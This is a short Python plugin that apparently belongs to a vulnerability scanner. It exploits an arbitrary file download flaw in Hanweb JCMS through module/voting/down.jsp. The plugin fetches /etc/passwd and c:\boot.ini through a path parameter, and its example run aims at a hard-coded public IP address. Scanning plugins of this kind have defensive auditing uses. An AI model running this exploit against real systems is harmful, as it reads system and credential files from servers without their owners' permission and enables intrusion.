#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 大汉网络JCMS module/voting/down.jsp任意文件下载
import re

def assign(service, arg):
    if service == "hanweb":
        return True, arg

def audit(arg):
    down_files = ['/etc/passwd','c:\\boot.ini'] #下载文件路径自己可以添加
    for down_file in down_files:
        payload = 'jcms/m_5_e/module/voting/down.jsp?filename=download.txt&pathfile=%s' % down_file
        target = arg + payload 
        code, head, res, errcode, _ = curl.curl2(target)
        if code ==200:
            keys=['root','boot loader']
            for key in keys:
                if key in res:
                    security_hole(target)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('hanweb', 'http://218.94.101.3:7001/')[1])